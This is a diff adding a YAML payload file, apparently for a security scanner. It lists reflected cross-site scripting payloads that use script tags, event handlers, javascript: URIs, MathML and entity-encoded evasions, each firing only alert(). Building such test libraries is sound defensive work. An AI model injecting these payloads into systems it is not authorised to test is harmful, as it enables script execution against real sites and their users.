@@ -1,0 +1,156 @@
+name: "XSS Reflected Payloads"
+description: "Cross-site scripting payloads for reflected XSS testing"
+attack_type: "xss"
+category: "reflected"
+
+payloads:
+  # Basic script tags
+  - value: "<script>alert(1)</script>"
+    description: "Basic script tag"
+    tags: ["basic", "script"]
+    severity: "high"
+
+  - value: "<script>alert('XSS')</script>"
+    description: "Script with string"
+    tags: ["basic", "script"]
+
+  - value: "<script>alert(document.domain)</script>"
+    description: "Script revealing domain"
+    tags: ["basic", "script", "info-disclosure"]
+
+  - value: "<script>alert(document.cookie)</script>"
+    description: "Cookie stealing payload"
+    tags: ["basic", "script", "cookie"]
+
+  # Image tag payloads
+  - value: "<img src=x onerror=alert(1)>"
+    description: "Image onerror handler"
+    tags: ["img", "event-handler"]
+
+  - value: "<img src=x onerror=alert('XSS')>"
+    description: "Image with string alert"
+    tags: ["img", "event-handler"]
+
+  - value: "<img/src=x onerror=alert(1)>"
+    description: "Image without space"
+    tags: ["img", "event-handler", "no-space"]
+
+  - value: "<img src=x onerror=alert`1`>"
+    description: "Template literal alert"
+    tags: ["img", "event-handler", "template-literal"]
+
+  - value: "<img src=1 onerror=alert(1)//>"
+    description: "Comment terminated"
+    tags: ["img", "event-handler", "comment"]
+
+  # SVG payloads
+  - value: "<svg onload=alert(1)>"
+    description: "SVG onload"
+    tags: ["svg", "event-handler"]
+
+  - value: "<svg/onload=alert(1)>"
+    description: "SVG without space"
+    tags: ["svg", "event-handler", "no-space"]
+
+  - value: "<svg onload=alert`1`>"
+    description: "SVG template literal"
+    tags: ["svg", "event-handler", "template-literal"]
+
+  - value: "<svg><script>alert(1)</script></svg>"
+    description: "SVG with embedded script"
+    tags: ["svg", "script"]
+
+  # Body tag payloads
+  - value: "<body onload=alert(1)>"
+    description: "Body onload"
+    tags: ["body", "event-handler"]
+
+  - value: "<body onpageshow=alert(1)>"
+    description: "Body onpageshow"
+    tags: ["body", "event-handler"]
+
+  # Input payloads
+  - value: "<input onfocus=alert(1) autofocus>"
+    description: "Input autofocus"
+    tags: ["input", "event-handler", "autofocus"]
+
+  - value: "<input onblur=alert(1) autofocus><input autofocus>"
+    description: "Input blur trigger"
+    tags: ["input", "event-handler"]
+
+  # Iframe payloads
+  - value: "<iframe src=\"javascript:alert(1)\">"
+    description: "Iframe javascript src"
+    tags: ["iframe", "javascript-uri"]
+
+  - value: "<iframe onload=alert(1)>"
+    description: "Iframe onload"
+    tags: ["iframe", "event-handler"]
+
+  # Anchor payloads
+  - value: "<a href=\"javascript:alert(1)\">click</a>"
+    description: "Anchor javascript href"
+    tags: ["anchor", "javascript-uri"]
+
+  - value: "<a href=javascript:alert(1)>X</a>"
+    description: "Anchor without quotes"
+    tags: ["anchor", "javascript-uri", "no-quotes"]
+
+  # Details/Summary
+  - value: "<details open ontoggle=alert(1)>"
+    description: "Details ontoggle"
+    tags: ["details", "event-handler"]
+
+  # Marquee (legacy but sometimes works)
+  - value: "<marquee onstart=alert(1)>"
+    description: "Marquee onstart"
+    tags: ["marquee", "event-handler", "legacy"]
+
+  # Video/Audio
+  - value: "<video src=x onerror=alert(1)>"
+    description: "Video onerror"
+    tags: ["video", "event-handler"]
+
+  - value: "<audio src=x onerror=alert(1)>"
+    description: "Audio onerror"
+    tags: ["audio", "event-handler"]
+
+  # Object/Embed
+  - value: "<object data=\"javascript:alert(1)\">"
+    description: "Object javascript data"
+    tags: ["object", "javascript-uri"]
+
+  - value: "<embed src=\"javascript:alert(1)\">"
+    description: "Embed javascript src"
+    tags: ["embed", "javascript-uri"]
+
+  # Math (MathML)
+  - value: "<math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert(1)\">X</maction></math>"
+    description: "MathML XSS"
+    tags: ["math", "mathml"]
+
+  # Various event handlers
+  - value: "<div onmouseover=alert(1)>hover</div>"
+    description: "Div mouseover"
+    tags: ["div", "event-handler", "user-interaction"]
+
+  - value: "<div onclick=alert(1)>click</div>"
+    description: "Div onclick"
+    tags: ["div", "event-handler", "user-interaction"]
+
+  - value: "<p onmousemove=alert(1)>move</p>"
+    description: "Paragraph mousemove"
+    tags: ["p", "event-handler", "user-interaction"]
+
+  # Encoded variations
+  - value: "<script>alert&#40;1&#41;</script>"
+    description: "HTML entity encoded parentheses"
+    tags: ["script", "html-entity"]
+
+  - value: "<script>alert&#x28;1&#x29;</script>"
+    description: "Hex entity encoded"
+    tags: ["script", "hex-entity"]
+
+  - value: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>"
+    description: "Decimal entity in event handler"
+    tags: ["img", "decimal-entity"]
